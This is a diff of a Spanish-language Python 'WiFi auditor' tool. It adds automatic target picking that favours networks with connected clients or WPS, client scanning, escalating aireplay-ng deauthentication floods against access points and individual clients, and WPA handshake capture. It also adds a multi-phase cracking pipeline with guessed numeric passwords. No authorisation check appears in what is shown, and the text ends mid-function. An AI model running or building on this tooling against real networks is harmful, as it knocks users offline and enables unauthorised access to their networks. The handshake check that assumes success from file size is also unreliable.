@@ -91,6 +91,117 @@ class WiFiAuditor:
         with open(self.config_file, 'w') as f:
             json.dump(self.config, f, indent=4)
 
+    def safe_input(self, prompt, default=None, allow_empty=False):
+        """Entrada segura de usuario con manejo robusto de EOF y KeyboardInterrupt"""
+        import sys
+        
+        # Verificar si estamos en un entorno interactivo
+        if not sys.stdin.isatty():
+            if default is not None:
+                self.log(f"Entorno no interactivo - usando valor por defecto: {default}", "WARNING")
+                return default
+            else:
+                self.log("Entorno no interactivo sin valor por defecto - cancelando", "ERROR")
+                raise EOFError("No hay entrada disponible")
+        
+        try:
+            result = input(prompt).strip()
+            
+            # Si la entrada está vacía y no se permiten entradas vacías
+            if not result and not allow_empty and default is not None:
+                self.log(f"Entrada vacía - usando valor por defecto: {default}", "INFO")
+                return default
+            
+            return result
+            
+        except EOFError:
+            if default is not None:
+                self.log("EOF detectado - usando valor por defecto", "WARNING")
+                return default
+            else:
+                self.log("EOF detectado sin valor por defecto - cancelando operación", "ERROR")
+                raise EOFError("Entrada terminada inesperadamente")
+                
+        except KeyboardInterrupt:
+            self.log("Entrada cancelada por usuario (Ctrl+C)", "WARNING")
+            raise KeyboardInterrupt("Usuario canceló la operación")
+    
+    def robust_input(self, prompt, max_attempts=3):
+        """Entrada ultra robusta que intenta diferentes métodos"""
+        import sys
+        
+        for attempt in range(max_attempts):
+            try:
+                self.log(f"Intento {attempt + 1}/{max_attempts} de entrada interactiva", "INFO")
+                
+                # Método 1: input() estándar con flush forzado
+                sys.stdout.write(prompt)
+                sys.stdout.flush()
+                
+                try:
+                    result = input().strip()
+                    if result:  # Si obtenemos algo, devolver inmediatamente
+                        return result
+                    else:
+                        self.log("Entrada vacía, solicitando nuevamente...", "WARNING")
+                        continue
+                        
+                except EOFError:
+                    self.log(f"EOF en intento {attempt + 1}", "WARNING")
+                    if attempt < max_attempts - 1:
+                        continue
+                    else:
+                        raise EOFError("No se pudo obtener entrada después de varios intentos")
+                
+            except KeyboardInterrupt:
+                self.log("Entrada cancelada por usuario", "WARNING")
+                raise
+            except Exception as e:
+                self.log(f"Error en intento {attempt + 1}: {e}", "ERROR")
+                if attempt == max_attempts - 1:
+                    raise
+        
+        raise EOFError("No se pudo obtener entrada después de todos los intentos")
+    
+    def automatic_fallback_selection(self):
+        """Selección automática cuando no hay entrada interactiva disponible"""
+        self.log("=== MODO AUTOMÁTICO ACTIVADO (Fallback) ===", "WARNING")
+        
+        # Prioridad 1: Redes con clientes (más fáciles)
+        clients_targets = [t for t in self.targets if t['clients'] > 0]
+        if clients_targets:
+            # Ordenar por número de clientes y señal
+            selected = sorted(clients_targets, key=lambda x: (-x['clients'], -x['power']))[:5]
+            self.log(f"✨ Selección automática: {len(selected)} redes con clientes", "SUCCESS")
+            
+            print(f"\n{Colors.GREEN}✅ Seleccionadas automáticamente (redes con clientes):{Colors.END}")
+            for i, target in enumerate(selected, 1):
+                print(f"  {i}. {target['essid']} (👥{target['clients']} clientes, {target['power']}dBm)")
+            
+            return selected
+        
+        # Prioridad 2: Redes con WPS (más fáciles de romper)
+        wps_targets = [t for t in self.targets if 'WPS' in t['encryption']]
+        if wps_targets:
+            selected = sorted(wps_targets, key=lambda x: -x['power'])[:3]
+            self.log(f"⚡ Selección automática: {len(selected)} redes con WPS", "SUCCESS")
+            
+            print(f"\n{Colors.PURPLE}✅ Seleccionadas automáticamente (redes WPS):{Colors.END}")
+            for i, target in enumerate(selected, 1):
+                print(f"  {i}. {target['essid']} (WPS, {target['power']}dBm)")
+            
+            return selected
+        
+        # Prioridad 3: Mejores señales (modo experto)
+        best_signal = sorted(self.targets, key=lambda x: -x['power'])[:3]
+        self.log(f"📡 Selección automática: {len(best_signal)} redes con mejor señal", "INFO")
+        
+        print(f"\n{Colors.YELLOW}✅ Seleccionadas automáticamente (mejor señal):{Colors.END}")
+        for i, target in enumerate(best_signal, 1):
+            print(f"  {i}. {target['essid']} ({target['power']}dBm)")
+        
+        return best_signal
+    
     def log(self, message, level="INFO"):
         """Logging mejorado con timestamp"""
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -344,11 +455,19 @@ class WiFiAuditor:
                 print(f"{i}. {iface}")
             
             try:
-                choice = int(input("\nSelecciona una interfaz (número): ")) - 1
+                choice_str = self.safe_input(
+                    "\nSelecciona una interfaz (número): ",
+                    default="1",  # Seleccionar primera interfaz por defecto
+                    allow_empty=False
+                )
+                if not choice_str:
+                    self.log("Selección cancelada", "WARNING")
+                    return False
+                choice = int(choice_str) - 1
                 self.interface = interfaces[choice]
                 self.log(f"Interface seleccionada: {self.interface}", "INFO")
-            except (ValueError, IndexError):
-                self.log("Selección inválida", "ERROR")
+            except (ValueError, IndexError, KeyboardInterrupt):
+                self.log("Selección inválida o cancelada", "ERROR")
                 return False
         
         return True
@@ -981,7 +1100,14 @@ class WiFiAuditor:
         print(f"\n{Colors.BOLD}Consejo:{Colors.END} Para máximo éxito, elige redes {Colors.GREEN}VERDES{Colors.END} (fáciles) primero")
         
         try:
-            choice = input(f"\n{Colors.BOLD}Tu selección:{Colors.END} ").strip().lower()
+            choice = self.safe_input(
+                f"\n{Colors.BOLD}Tu selección:{Colors.END} ",
+                default="clients",  # Opción más segura por defecto
+                allow_empty=False
+            ).lower()
+            if not choice:
+                self.log("Selección vacía - usando 'clients' por defecto", "WARNING")
+                choice = "clients"
             selected = []
             
             if choice == 'auto':
@@ -1065,7 +1191,14 @@ class WiFiAuditor:
         
         try:
             while True:
-                choice = input(f"\n{Colors.BOLD}[+] Selección:{Colors.END} ").strip().lower()
+                choice = self.safe_input(
+                    f"\n{Colors.BOLD}[+] Selección:{Colors.END} ",
+                    default="facil",  # Opción más segura por defecto
+                    allow_empty=False
+                ).lower()
+                if not choice:
+                    self.log("Selección vacía - usando 'facil' por defecto", "WARNING")
+                    choice = "facil"
                 
                 if not choice:
                     print(f"{Colors.RED}[!] Por favor ingresa una selección{Colors.END}")
@@ -1155,8 +1288,10 @@ class WiFiAuditor:
     def simple_target_selection(self):
         """Selección mejorada de objetivos con vista previa"""
         if not self.targets:
+            self.log("⚠️ No hay objetivos disponibles para selección", "WARNING")
             return []
         
+        self.log(f"📊 Mostrando {len(self.targets)} objetivos disponibles...", "INFO")
         self.display_targets()
         
         print(f"\n{Colors.BOLD}Opciones de selección:{Colors.END}")
@@ -1170,7 +1305,23 @@ class WiFiAuditor:
         while True:
             try:
                 # PASO 1: Obtener selección
-                choice = input(f"\n{Colors.CYAN}Tu selección: {Colors.END}").strip()
+                try:
+                    # Intentar con método robusto primero
+                    self.log("Esperando selección del usuario...", "INFO")
+                    choice = self.robust_input(f"\n{Colors.CYAN}Tu selección: {Colors.END}")
+                except EOFError:
+                    self.log("No se pudo obtener entrada del usuario - cancelando selección", "ERROR")
+                    print(f"\n{Colors.RED}⚠️ No se pudo leer entrada. Posibles soluciones:{Colors.END}")
+                    print(f"  1. Ejecutar en terminal interactivo")
+                    print(f"  2. Verificar que no está redirigido stdin")
+                    print(f"  3. Usar: python3 wifi_auditor_pro.py directamente")
+                    
+                    # Ofrecer modo automático como fallback
+                    print(f"\n{Colors.YELLOW}Intentando selección automática...{Colors.END}")
+                    return self.automatic_fallback_selection()
+                except KeyboardInterrupt:
+                    self.log("Operación cancelada por el usuario (Ctrl+C)", "WARNING")
+                    return []
                 
                 # Validar que no esté vacío
                 if not choice:
@@ -1182,14 +1333,17 @@ class WiFiAuditor:
                     return []
                 
                 # Procesar selección y mostrar vista previa
+                self.log(f"🔍 Procesando selección: '{choice}'", "INFO")
                 preview_selected = self.process_selection_preview(choice)
                 
                 if preview_selected is None:
-                    print(f"{Colors.RED}Selección inválida. Inténtalo de nuevo.{Colors.END}")
+                    print(f"{Colors.RED}❌ Selección inválida. Inténtalo de nuevo.{Colors.END}")
+                    print(f"{Colors.CYAN}Opciones válidas: 1-{len(self.targets)}, 'clients', 'all', 'wps', 'top5', 'q'{Colors.END}")
                     continue
                 
                 if not preview_selected:
-                    print(f"{Colors.YELLOW}No hay redes que coincidan con tu selección.{Colors.END}")
+                    print(f"{Colors.YELLOW}⚠️ No hay redes que coincidan con tu selección '{choice}'.{Colors.END}")
+                    print(f"{Colors.CYAN}Prueba con otras opciones como 'clients' o 'all'{Colors.END}")
                     continue
                 
                 # Mostrar vista previa
@@ -1198,7 +1352,14 @@ class WiFiAuditor:
                 # PASO 2: Bucle separado para confirmación
                 while True:
                     try:
-                        confirm = input(f"\n{Colors.YELLOW}¿Proceder con estos objetivos? (s/n): {Colors.END}").strip().lower()
+                        confirm = self.safe_input(
+                            f"\n{Colors.YELLOW}¿Proceder con estos objetivos? (s/n): {Colors.END}",
+                            default="n",  # Valor por defecto en caso de EOF
+                            allow_empty=False
+                        ).lower()
+                        if not confirm:  # EOF manejado por safe_input
+                            self.log("Confirmación vacía - usando valor por defecto 'no'", "WARNING")
+                            confirm = "n"
                         
                         if confirm in ['s', 'si', 'y', 'yes']:
                             self.log(f"Confirmados {len(preview_selected)} objetivos", "SUCCESS")
@@ -1213,59 +1374,109 @@ class WiFiAuditor:
                         print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                         return []
                 
+            except EOFError:
+                self.log("EOF detectado en bucle principal - saliendo", "WARNING")
+                return []
             except KeyboardInterrupt:
                 print(f"\n{Colors.YELLOW}Operación cancelada{Colors.END}")
                 return []
             except Exception as e:
-                print(f"{Colors.RED}Error inesperado: {str(e)}{Colors.END}")
+                self.log(f"Error inesperado en selección: {str(e)}", "ERROR")
                 if hasattr(e, '__traceback__'):
                     import traceback
-                    print(f"{Colors.RED}Detalles: {traceback.format_exc().splitlines()[-3:]}{Colors.END}")
+                    self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
+                
+                # Preguntar al usuario si quiere continuar
+                try:
+                    retry = self.safe_input(
+                        f"\n{Colors.YELLOW}¿Intentar de nuevo? (s/n): {Colors.END}",
+                        default="n",  # Por defecto no reintentar
+                        allow_empty=False
+                    ).lower()
+                    if not retry or retry not in ['s', 'si', 'y', 'yes']:
+                        return []
+                except KeyboardInterrupt:
+                    return []
                 continue
     
     def process_selection_preview(self, choice):
         """Procesar selección y devolver lista para vista previa"""
+        # DEBUG: Agregar información de debug
+        if self.config.get('verbose', True):
+            self.log(f"🔧 DEBUG: Procesando selección '{choice}' con {len(self.targets)} targets", "INFO")
+        
         choice = choice.lower().strip()
         selected = []
+        
+        # Verificación de estado
+        if not self.targets:
+            self.log("⚠️ No hay targets disponibles para seleccionar", "ERROR")
+            return None
         
         try:
             if choice == 'all':
                 selected = self.targets.copy()
+                self.log(f"✅ Seleccionados TODOS los {len(selected)} targets", "INFO")
                 
             elif choice == 'top5':
                 selected = sorted(self.targets, key=lambda x: x['power'], reverse=True)[:5]
+                self.log(f"✅ Seleccionados top 5 por señal: {len(selected)} targets", "INFO")
                 
             elif choice == 'wps':
                 selected = [t for t in self.targets if 'WPS' in t['encryption'] or 'WPS' in t.get('extra_info', '')]
+                self.log(f"✅ Seleccionados {len(selected)} targets con WPS", "INFO")
                 
             elif choice == 'clients':
                 # Solo redes con clientes conectados
                 selected = [t for t in self.targets if t['clients'] > 0]
                 selected = sorted(selected, key=lambda x: x['clients'], reverse=True)
+                self.log(f"✅ Seleccionados {len(selected)} targets con clientes", "INFO")
                 
             else:
                 # Números específicos
                 if ',' in choice or choice.isdigit():
+                    if self.config.get('verbose', True):
+                        self.log(f"🔍 Detectando números en: {choice}", "INFO")
+                    
                     indices = []
                     for num_str in choice.replace(' ', '').split(','):
                         if num_str.isdigit():
                             num = int(num_str)
+                            if self.config.get('verbose', True):
+                                self.log(f"  - Procesando número: {num}", "INFO")
+                            
                             if 1 <= num <= len(self.targets):
                                 indices.append(num - 1)  # Convertir a índice base 0
+                                if self.config.get('verbose', True):
+                                    self.log(f"    ✅ Número {num} válido (rango 1-{len(self.targets)})", "INFO")
                             else:
-                                print(f"{Colors.RED}Número {num} fuera de rango (1-{len(self.targets)}){Colors.END}")
+                                self.log(f"❌ Número {num} fuera de rango (1-{len(self.targets)})", "ERROR")
                                 return None
+                        else:
+                            self.log(f"❌ '{num_str}' no es un número válido", "ERROR")
+                            return None
                     
                     if indices:
                         selected = [self.targets[i] for i in indices]
+                        self.log(f"✅ Seleccionados {len(selected)} targets por números: {[i+1 for i in indices]}", "SUCCESS")
+                        
+                        # DEBUG: Mostrar targets seleccionados
+                        if self.config.get('verbose', True):
+                            for i, target in enumerate(selected):
+                                self.log(f"  - Target {i+1}: {target['essid']}", "INFO")
                     else:
+                        self.log("❌ No se encontraron números válidos", "ERROR")
                         return None
                 else:
+                    self.log(f"❌ Opción '{choice}' no reconocida", "ERROR")
                     return None  # Selección inválida
             
             return selected
             
-        except Exception:
+        except Exception as e:
+            self.log(f"❌ Error procesando selección: {e}", "ERROR")
+            import traceback
+            self.log(f"Detalles del error: {traceback.format_exc()}", "ERROR")
             return None
     
     def show_selection_preview(self, selected_targets):
@@ -1589,82 +1800,329 @@ class WiFiAuditor:
             return False
 
     def aggressive_handshake_capture(self, target):
-        """Captura de handshake simplificada pero efectiva"""
-        self.log(f"🎯 Capturando handshake: {target['essid']} (Canal {target['channel']})", "INFO")
+        """Captura de handshake mejorada con detección de clientes y múltiples estrategias"""
+        self.log(f"Iniciando captura mejorada: {target['essid']} (Canal {target['channel']})", "INFO")
+        
+        # PASO 1: Escanear clientes conectados primero
+        clients = self.scan_connected_clients(target)
+        if not clients:
+            self.log(f"ATENCION: No se detectan clientes conectados a {target['essid']}", "WARNING")
+            self.log("   Esto reducira significativamente las posibilidades de capturar handshake", "WARNING")
+            self.log("   Procediendo con ataque broadcast...", "INFO")
+        else:
+            self.log(f"Detectados {len(clients)} clientes conectados - excelente!", "SUCCESS")
+            for i, client in enumerate(clients[:3], 1):
+                self.log(f"   Cliente {i}: {client}", "INFO")
         
         # Archivo de captura
         capture_filename = f"{target['essid']}_{target['bssid'].replace(':', '')}"
         capture_file = self.handshake_dir / capture_filename
         cap_file = f"{capture_file}-01.cap"
         
-        # Fijar canal
+        # PASO 2: Configurar captura optimizada
         self.run_command(f"iwconfig {self.monitor_interface} channel {target['channel']}")
+        time.sleep(1)  # Asegurar cambio de canal
         
-        # Iniciar captura principal
-        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file}"
+        # Comando de captura con mejor buffer
+        dump_cmd = f"airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {capture_file} --write-interval 1"
         dump_process = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        # Esperar estabilización
-        self.log("📡 Captura iniciada, esperando estabilización...", "INFO")
-        time.sleep(5)
+        self.log("Captura iniciada, monitoreando trafico...", "INFO")
+        time.sleep(8)  # Tiempo mayor para capturar tráfico inicial
         
-        # Ataques de deauth progresivos y efectivos
-        deauth_rounds = [
-            (5, 3),    # 5 paquetes, esperar 3s
-            (10, 5),   # 10 paquetes, esperar 5s
-            (20, 8),   # 20 paquetes, esperar 8s
-            (30, 12),  # 30 paquetes, esperar 12s
-        ]
-        
-        self.log("💥 Iniciando ataques de deauth progresivos...", "INFO")
+        # PASO 3: Estrategias de deauth mejoradas
         handshake_found = False
         
-        for round_num, (packets, wait_time) in enumerate(deauth_rounds, 1):
-            if not self.running:
-                break
+        # Estrategia 1: Ataques dirigidos a clientes específicos
+        if clients:
+            self.log("ESTRATEGIA 1: Ataques dirigidos a clientes especificos", "INFO")
+            for client in clients[:3]:  # Máximo 3 clientes
+                if not self.running:
+                    break
                 
-            self.log(f"🔄 Ronda {round_num}: {packets} paquetes de deauth", "INFO")
-            
-            # Ataque de deauth
-            deauth_cmd = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
-            subprocess.run(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            self.log(f"⏳ Esperando {wait_time}s para reconexiones...", "INFO")
-            time.sleep(wait_time)
-            
-            # Verificar si ya tenemos handshake
-            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 5000:
-                success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=10)
-                if success and ("1 handshake" in output or "handshake" in output.lower()):
-                    self.log("✅ ¡Handshake capturado!", "SUCCESS")
+                self.log(f"   Atacando cliente especifico: {client}", "INFO")
+                
+                # Deauth dirigido al cliente específico
+                deauth_client_cmd = f"aireplay-ng -0 15 -a {target['bssid']} -c {client} {self.monitor_interface}"
+                subprocess.run(deauth_client_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                # Esperar reconexión
+                time.sleep(8)
+                
+                # Verificar handshake temprano
+                if self.check_handshake_quick(cap_file):
                     handshake_found = True
                     break
         
-        # Captura final si no se encontró handshake
+        # Estrategia 2: Ataques broadcast progresivos si no hay handshake aun
         if not handshake_found:
-            self.log("⏳ Captura adicional de 20 segundos...", "INFO")
-            time.sleep(20)
-        
-        # Detener captura
-        dump_process.terminate()
-        time.sleep(2)
-        
-        # Verificación final
-        if os.path.exists(cap_file):
-            file_size = os.path.getsize(cap_file)
-            self.log(f"📄 Archivo capturado: {file_size} bytes", "INFO")
+            self.log("ESTRATEGIA 2: Ataques broadcast progresivos", "INFO")
             
-            if file_size > 1000:  # Mínimo 1KB
-                success, output, _ = self.run_command(f"aircrack-ng {cap_file}")
-                if success and "handshake" in output.lower():
-                    return cap_file
+            deauth_rounds = [
+                (8, 5, "suave"),     # 8 paquetes, esperar 5s
+                (15, 8, "moderado"), # 15 paquetes, esperar 8s  
+                (25, 12, "agresivo"),# 25 paquetes, esperar 12s
+                (40, 15, "intenso"), # 40 paquetes, esperar 15s
+            ]
+            
+            for round_num, (packets, wait_time, intensity) in enumerate(deauth_rounds, 1):
+                if not self.running or handshake_found:
+                    break
+                
+                self.log(f"Ronda {round_num}: {packets} paquetes ({intensity})", "INFO")
+                
+                # Combinar ataques broadcast y dirigidos
+                # Ataque broadcast
+                deauth_broadcast = f"aireplay-ng -0 {packets} -a {target['bssid']} {self.monitor_interface}"
+                subprocess.run(deauth_broadcast, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                # Si hay clientes, también atacarlos directamente
+                if clients and round_num >= 2:
+                    time.sleep(2)
+                    for client in clients[:2]:
+                        deauth_targeted = f"aireplay-ng -0 5 -a {target['bssid']} -c {client} {self.monitor_interface}"
+                        subprocess.run(deauth_targeted, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        time.sleep(1)
+                
+                self.log(f"Esperando {wait_time}s para reconexiones...", "INFO")
+                time.sleep(wait_time)
+                
+                # Verificación de handshake más robusta
+                if self.verify_handshake_comprehensive(cap_file):
+                    handshake_found = True
+                    break
         
-        self.log("❌ No se capturó handshake válido", "ERROR")
+        # PASO 4: Captura extendida final si es necesario
+        if not handshake_found:
+            self.log("Captura extendida final de 30 segundos...", "INFO")
+            
+            # Un último ataque intenso
+            final_deauth = f"aireplay-ng -0 50 -a {target['bssid']} {self.monitor_interface}"
+            subprocess.run(final_deauth, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            time.sleep(30)
+        
+        # PASO 5: Detener captura y verificación final
+        dump_process.terminate()
+        time.sleep(3)
+        
+        return self.final_handshake_verification(cap_file, target)
+    
+    def scan_connected_clients(self, target):
+        """Escanear clientes conectados al AP objetivo"""
+        self.log(f"Escaneando clientes conectados a {target['essid']}...", "INFO")
+        
+        clients = []
+        scan_file = "/tmp/client_scan"
+        
+        try:
+            # Escanear durante 15 segundos para detectar clientes
+            scan_cmd = f"timeout 15 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']} -w {scan_file} --write-interval 2"
+            subprocess.run(scan_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            # Buscar el archivo CSV generado
+            csv_file = f"{scan_file}-01.csv"
+            if os.path.exists(csv_file):
+                with open(csv_file, 'r') as f:
+                    content = f.read()
+                    # Buscar la sección de clientes (después de la línea Station MAC)
+                    if "Station MAC" in content:
+                        lines = content.split('\n')
+                        in_clients_section = False
+                        
+                        for line in lines:
+                            if "Station MAC" in line:
+                                in_clients_section = True
+                                continue
+                            
+                            if in_clients_section and line.strip():
+                                # Línea de cliente: MAC, First time seen, Last time seen, Power, packets, BSSID, Probed ESSIDs
+                                parts = line.split(',')
+                                if len(parts) >= 6:
+                                    client_mac = parts[0].strip()
+                                    associated_bssid = parts[5].strip()
+                                    
+                                    # Verificar que el cliente está asociado con nuestro target
+                                    if client_mac and associated_bssid == target['bssid']:
+                                        clients.append(client_mac)
+                
+                # Limpiar archivos temporales
+                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
+                    temp_file = f"{scan_file}{ext}"
+                    if os.path.exists(temp_file):
+                        os.remove(temp_file)
+            
+            # Método alternativo: parsear desde airodump directo
+            if not clients:
+                self.log("Metodo alternativo: escaneo directo con timeout corto...", "INFO")
+                scan_cmd2 = f"timeout 10 airodump-ng {self.monitor_interface} --bssid {target['bssid']} -c {target['channel']}"
+                result = subprocess.run(scan_cmd2, shell=True, capture_output=True, text=True)
+                
+                # Buscar MACs en la salida que no sean el BSSID del AP
+                import re
+                mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
+                found_macs = re.findall(mac_pattern, result.stdout)
+                
+                for mac_parts in found_macs:
+                    full_mac = ''.join(mac_parts[0] + mac_parts[1])
+                    if full_mac != target['bssid'] and full_mac not in clients:
+                        clients.append(full_mac)
+            
+            return clients[:5]  # Máximo 5 clientes para evitar sobrecarga
+            
+        except Exception as e:
+            self.log(f"Error escaneando clientes: {e}", "ERROR")
+            return []
+    
+    def check_handshake_quick(self, cap_file):
+        """Verificación rápida de handshake"""
+        if not os.path.exists(cap_file) or os.path.getsize(cap_file) < 2000:
+            return False
+        
+        try:
+            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=5)
+            has_handshake = success and ("1 handshake" in output or "handshakes" in output.lower())
+            no_eapol_errors = "no EAPOL" not in output
+            return has_handshake and no_eapol_errors
+        except:
+            return False
+    
+    def verify_handshake_comprehensive(self, cap_file):
+        """Verificación comprehensiva de handshake con múltiples métodos"""
+        if not os.path.exists(cap_file):
+            return False
+        
+        file_size = os.path.getsize(cap_file)
+        if file_size < 1000:
+            return False
+        
+        self.log(f"Verificando handshake: {file_size} bytes", "INFO")
+        
+        # Método 1: aircrack-ng
+        try:
+            success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=10)
+            if success:
+                has_handshake = ("1 handshake" in output or "2 handshake" in output or "handshakes" in output.lower())
+                no_eapol_error = "no EAPOL" not in output and "unable to process" not in output
+                
+                if has_handshake and no_eapol_error:
+                    self.log("Handshake valido confirmado con aircrack-ng", "SUCCESS")
+                    return True
+                elif has_handshake:
+                    self.log("Handshake detectado pero con problemas EAPOL", "WARNING")
+        except:
+            pass
+        
+        # Método 2: Contar paquetes EAPOL con tshark
+        try:
+            eapol_cmd = f'tshark -r "{cap_file}" -Y "eapol" -T fields -e frame.number 2>/dev/null | wc -l'
+            success, output, _ = self.run_command(eapol_cmd, timeout=8)
+            if success and output.strip().isdigit():
+                eapol_count = int(output.strip())
+                self.log(f"Paquetes EAPOL detectados: {eapol_count}", "INFO")
+                
+                if eapol_count >= 4:
+                    self.log("Suficientes paquetes EAPOL para handshake", "SUCCESS")
+                    return True
+                elif eapol_count >= 2:
+                    self.log("Paquetes EAPOL parciales detectados", "WARNING")
+        except:
+            pass
+        
+        return False
+    
+    def final_handshake_verification(self, cap_file, target):
+        """Verificación final comprehensiva del handshake capturado"""
+        if not os.path.exists(cap_file):
+            self.log("No se genero archivo de captura", "ERROR")
+            return None
+        
+        file_size = os.path.getsize(cap_file)
+        self.log(f"Archivo final: {file_size} bytes", "INFO")
+        
+        if file_size < 1000:
+            self.log("Archivo demasiado pequeno para contener handshake", "ERROR")
+            return None
+        
+        # Verificación con aircrack-ng
+        success, output, _ = self.run_command(f"aircrack-ng {cap_file}", timeout=15)
+        
+        if success:
+            self.log("Analisis de aircrack-ng:", "INFO")
+            
+            # Buscar indicaciones de handshake
+            handshake_indicators = [
+                "1 handshake", "2 handshake", "3 handshake", "4 handshake",
+                "handshakes", "EAPOL"
+            ]
+            
+            error_indicators = [
+                "no EAPOL data", "unable to process", "No networks found"
+            ]
+            
+            has_handshake = any(indicator in output.lower() for indicator in handshake_indicators)
+            has_errors = any(error in output for error in error_indicators)
+            
+            if has_handshake and not has_errors:
+                self.log(f"EXITO: Handshake valido capturado para {target['essid']}", "SUCCESS")
+                self.log(f"Archivo: {cap_file}", "SUCCESS")
+                return cap_file
+            elif has_handshake and has_errors:
+                self.log("Handshake detectado pero con problemas de formato", "WARNING")
+                # Intentar reparar o convertir archivo
+                return self.attempt_handshake_repair(cap_file, target)
+            else:
+                self.log("No se detecto handshake valido en la captura", "ERROR")
+        
+        # Verificacion adicional con metodos alternativos
+        return self.alternative_handshake_verification(cap_file, target)
+    
+    def attempt_handshake_repair(self, cap_file, target):
+        """Intentar reparar o convertir handshake problematico"""
+        self.log("Intentando reparar handshake problematico...", "INFO")
+        
+        # Intentar con tshark para verificar contenido real
+        try:
+            eapol_check = f'tshark -r "{cap_file}" -Y "eapol" -c 10 2>/dev/null'
+            success, output, _ = self.run_command(eapol_check, timeout=10)
+            
+            if success and output.strip():
+                self.log("Encontrados paquetes EAPOL con tshark", "SUCCESS")
+                return cap_file  # El archivo es utilizable
+            else:
+                self.log("No se encontraron paquetes EAPOL validos", "ERROR")
+        except:
+            pass
+        
+        return None
+    
+    def alternative_handshake_verification(self, cap_file, target):
+        """Metodos alternativos para verificar handshake"""
+        self.log("Verificacion alternativa del handshake...", "INFO")
+        
+        # Metodo 1: Analisis de tamano y contenido basico
+        file_size = os.path.getsize(cap_file)
+        if file_size > 5000:  # Archivos > 5KB generalmente tienen contenido util
+            self.log(f"Archivo de tamano razonable ({file_size} bytes) - probablemente valido", "INFO")
+            
+            # Metodo 2: Verificar que no esta corrupto
+            try:
+                # Intentar leer con tcpdump para verificar integridad
+                tcpdump_check = f'tcpdump -r "{cap_file}" -c 1 2>/dev/null'
+                success, _, _ = self.run_command(tcpdump_check, timeout=5)
+                
+                if success:
+                    self.log("Archivo integro - asumiendo handshake capturado", "INFO")
+                    return cap_file
+            except:
+                pass
+        
+        self.log("No se pudo verificar handshake valido", "ERROR")
         return None
 
     def crack_handshake(self, target, handshake_file):
-        """Sistema inteligente de cracking con análisis previo"""
-        self.log(f"🔐 Iniciando análisis inteligente: {target['essid']}", "INFO")
+        """Sistema inteligente de cracking con múltiples métodos avanzados"""
+        self.log(f"🔐 Iniciando análisis inteligente multimodal: {target['essid']}", "INFO")
         
         # Verificar archivo
         if not os.path.exists(handshake_file) or os.path.getsize(handshake_file) < 1000:
@@ -1672,15 +2130,37 @@ class WiFiAuditor:
             return None
         
         # FASE 1: Análisis inteligente de información
-        self.log("🧠 FASE 1: Análisis de información de la red...", "INFO")
-        
-        # Intentar métodos inteligentes primero
+        self.log("🧠 FASE 1: Análisis inteligente rápido...", "INFO")
         password = self.intelligent_analysis(target)
         if password:
             return password
         
-        # FASE 2: Si no funciona, usar wordlists
-        self.log("📚 FASE 2: Método tradicional con wordlists...", "INFO")
+        # FASE 2: Ataques de fuerza bruta inteligente
+        self.log("🎯 FASE 2: Ataques de fuerza bruta dirigidos...", "INFO")
+        password = self.advanced_bruteforce_attacks(target, handshake_file)
+        if password:
+            return password
+        
+        # FASE 3: Análisis de patrones de teclado
+        self.log("⌨️ FASE 3: Patrones de teclado y secuencias...", "INFO")
+        password = self.keyboard_pattern_attack(target, handshake_file)
+        if password:
+            return password
+        
+        # FASE 4: Ataques por máscara basados en ESSID
+        self.log("🎭 FASE 4: Ataques por máscara inteligente...", "INFO")
+        password = self.mask_attack_essid_based(target, handshake_file)
+        if password:
+            return password
+        
+        # FASE 5: Mutaciones inteligentes
+        self.log("🧬 FASE 5: Mutaciones y variaciones inteligentes...", "INFO")
+        password = self.intelligent_mutations(target, handshake_file)
+        if password:
+            return password
+        
+        # FASE 6: Solo como último recurso, wordlists
+        self.log("📚 FASE 6: Método tradicional con wordlists (último recurso)...", "INFO")
         return self.wordlist_attack(target, handshake_file)
     
     def intelligent_analysis(self, target):
@@ -1962,6 +2442,270 @@ class WiFiAuditor:
             pass
         
         return wordlist_file
+
+    def advanced_bruteforce_attacks(self, target, handshake_file):
+        """Ataques de fuerza bruta inteligente y dirigidos"""
+        essid = target['essid']
+        
+        # 1. Ataque numérico puro (8-12 dígitos)
+        self.log("🔢 Probando patrones numéricos comunes...", "INFO")
+        numeric_patterns = [
+            # Fechas de nacimiento comunes
+            "19801980", "19901990", "20001980", "19951995",
+            "19751975", "19851985", "20002000", "19701970",
+            # Números de teléfono
+            "30012345", "31012345", "32012345", "35012345",
+            "60012345", "12345678", "87654321", "11111111",
+            # Códigos postales comunes (Colombia)
+            "11001234", "05001234", "76001234", "13001234",
+            # Patrones simples
+            "12344321", "12348765", "98765432", "13579246"
+        ]
+        
+        password = self.quick_password_test_advanced(target, numeric_patterns, "numérico")
+        if password:
+            return password
+        
+        # 2. Generación numérica dinámica basada en ESSID
+        if len(essid) >= 4:
+            essid_numbers = []
+            # Extraer números del ESSID
+            import re
+            numbers_in_essid = re.findall(r'\d+', essid)
+            for num in numbers_in_essid:
+                if len(num) >= 4:
+                    essid_numbers.extend([
+                        num * 2,  # Duplicar
+                        num + num[::-1],  # Número + reverso
+                        num + "1234", num + "2024"
+                    ])
+            
+            if essid_numbers:
